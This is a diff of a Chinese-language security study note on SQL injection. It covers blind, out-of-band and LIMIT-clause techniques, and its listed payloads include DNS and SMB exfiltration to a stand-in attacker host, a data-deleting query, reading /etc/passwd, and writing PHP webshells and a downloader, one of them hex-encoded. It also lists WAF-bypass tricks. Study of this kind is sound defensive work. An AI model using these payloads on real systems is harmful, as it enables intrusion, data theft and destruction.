@@ -9,27 +9,52 @@ SQL注入漏洞(SQL injection) - 对用户请求中的输入的参数值过滤�
 * error-based 基于报错的SQL注入
 * UNION query-based 基于联合查询的SQL注入
 * stacked queries 堆叠查询
+  * 执行一次查询时，通过分号分隔sql语句，执行两条或更多的SQL语句
 * out-of-band 带外
 
-### 漏洞影响
+#### 例1 - "基于时间的盲注"
 
-（以时间型盲注为例）
+**基于时间的盲注(Time-Based Blind SQL Injection Attacks)**：利用能够"延时"的函数构造SQL语句 然后根据响应时长(响应时间间隔的数值大小)进行判断
 
-**时间型盲注(Time-Based Blind SQL Injection Attacks)**：利用能够"延时"的函数构造SQL语句 然后根据响应时长(响应时间间隔的数值大小)进行判断
-
-* Test case
+* 无害验证payload - 验证该漏洞是否存在
   * 如对某个使用MySQL数据库的WEB系统测试时发送的请求含payload `(select*from(select(sleep(20)))a)` 得到response的时间为20秒
-
-* Attacks case
-  * 时间型盲注漏洞 只需利用 条件语法(Condition syntax) 与延时函数 就能判断出执行结果True/False 根据结果判断逐个字符 从而得到数据库中的具体数据
+* 攻击利用payload - 利用该漏洞进行数据获取
+  * 基于时间的盲注漏洞 只需利用 条件语法(Condition syntax) 与延时函数 就能判断出执行结果True/False 根据结果判断逐个字符 从而得到数据库中的具体数据
     * 参考[Time-Based Blind SQL Injection Attacks](http://www.sqlinjection.net/time-based/) 和 [Timing-based Blind SQL Attacks](https://hackernoon.com/timing-based-blind-sql-attacks-bd276dc618dd)
       * MySQL`SLEEP(time)` `BENCHMARK(count, expr)`
       * SQL Server`WAIT FOR DELAY 'hh:mm:ss'` `WAIT FOR TIME 'hh:mm:ss'`
       * Oracle
-      * Postgres`SELECT CASE WHEN secret = 'secret' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;`
+      * Postgres `pg_sleep(5)` 如`SELECT CASE WHEN secret = 'secret' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;`
       * ...
-    * 自写脚本实现自动化获取(用二分法加速判断)
 
+### 漏洞危害
+
+[SQLi漏洞的各种具体利用方式【漏洞危害】 - The SQL Injection Knowledge Base](https://websec.ca/kb/sql_injection#MySQL_Writing_Files)
+
+* 数据泄露 - 通过"带外通道"获取数据(Out Of Band Channeling)
+  * DNS Requests - `LOAD_FILE`可以发出DNS请求
+    * MySQL `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\abc'));`
+  * SMB Requests - `INTO OUTFILE`可以发出SMB请求
+    * MySQL `' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`
+* 数据删除
+  * MySQL `DELETE FROM some_table WHERE 1; --`
+* 绕过判断
+  * Auth Bypass:如web登录功能存在SQLi 使用"万能密码"实现Login Bypass
+* 系统命令执行
+  * MSSQL的`xp_cmdshell`
+* 文件读写 - 前提:当前数据库user有FILE权限(通常数据库root用户才会有)
+  * 读取文件(Reading Files)
+    * MySQL - `LOAD_FILE()`
+    * 例1 `SELECT LOAD_FILE('/etc/passwd');` `SELECT LOAD_FILE(0x2F6574632F706173737764);`
+  * 写入文件(Writing Files)
+    * MySQL - `INTO OUTFILE` 或 `INTO DUMPFILE`
+    * 例1 写入WebShell `SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';` 访问WebShell `http://localhost/shell.php?c=cat%20/etc/passwd`
+    * 例2 Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`
+    * ...
+
+#### 数据获取 - 二分法
+
+数据获取:自写脚本 利用SQL注入漏洞获取数据(用二分法"加速判断" 缩短数据获取所需时长)
 ```
 test.get_version() #获取版本号
 test.get_user_first() #获取数据库用户权限
@@ -46,38 +71,52 @@ test.get_columns() #获取字段名
 test.get_content() #获取第一列第一个字段内容
 ```
 
+#### SQLi - BypassWAF
 
-[SQLi漏洞的各种具体利用方式【漏洞危害】 - The SQL Injection Knowledge Base](https://websec.ca/kb/sql_injection#MySQL_Writing_Files)
-
-* 数据泄露 - 通过"带外通道"获取数据(Out Of Band Channeling)
-  * DNS Requests - `LOAD_FILE`可以发出DNS请求
-    * MySQL `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\abc'));`
-  * SMB Requests - `INTO OUTFILE`可以发出SMB请求
-    * MySQL `' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`
-* 绕过判断
-  * Auth Bypass:如web登录功能存在SQLi 使用"万能密码"实现Login Bypass
-* 文件读写 - 前提:当前数据库user有FILE权限
-  * 读取文件(Reading Files)
-    * MySQL - `LOAD_FILE()`
-    * 例1 `SELECT LOAD_FILE('/etc/passwd');` `SELECT LOAD_FILE(0x2F6574632F706173737764);`
-  * 写入文件(Writing Files)
-    * MySQL - `INTO OUTFILE` 或 `INTO DUMPFILE`
-    * 例1 Get WebShell `SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';` 访问WebShell `http://localhost/shell.php?c=cat%20/etc/passwd`
-    * 例2 Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`
-
-### SQLi - BypassWAF
-
-* 用注释分割关键字
+* 大小写转换 `SeLecT`
+* 用注释分割关键字 `/**/`
 * HTTP参数污染(HTTP Parameter Pollution)
 * ...
 
 ### 重点检测
 
-* 无法使用"预编译语句"的情况
-  * `order by`
-  * `limit`
-* 宽字节注入
-* ...
+#### 无法使用"预编译语句"的情况 - `order by`
+
+#### 无法使用"预编译语句"的情况 - `limit`
+
+SQL Injections in MySQL LIMIT clause
+* 漏洞场景:SQL语句中`limit`之前有`order by`(无法使用`union select`). 注入点在`limit`子句之后的位置. 如`SELECT freld FROM table WHERE id>0 ORDER BY id LIMIT injection_point`
+* 利用条件:5.0.0<MySQL版本<5.6.6
+* 注意:MySQL版本>=5.7 无法利用. 因为`analyse()`的两个参数都只能为`uint`类型
+* 利用方式1 - 使用`analyse()`函数进行"基于报错的注入".
+* 利用方式2 - 使用`analyse()`函数进行"基于时间的注入". 实测只能用`benchmark` 而不能用`sleep`
+* 利用方式3 - 写入文件. 如果权限足够 可在`limit`之后紧跟`into`写入文件 得到webshell
+
+```
+# 利用方式1 - 基于报错的注入
+mysql> SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1
+       procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
+ERROR 1105 (HY000): XPATH syntax error: ':5.5.41-0ubuntu0.14.04.1'
+```
+
+```
+# 利用方式2 - 基于时间的注入
+SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1
+PROCEDURE analyse((select extractvalue(rand(),
+concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
+```
+
+```
+# 利用方式3 - 写入文件
+# Hex <-> ASCII
+# 3c3f7068702061737365727428245f504f53545b6173617361735d293b3f3e <-> <?php assert($_POST[asasas]);?>
+
+SELECT 1 from mysql.user order by 1 limit 0,1 into outfile '/tmp/s.php' LINES TERMINATED BY 0x3c3f7068702061737365727428245f504f53545b6173617361735d293b3f3e;
+```
+
+
+#### 宽字节注入
+
 
 ### SDL - 防御与修复方案
 
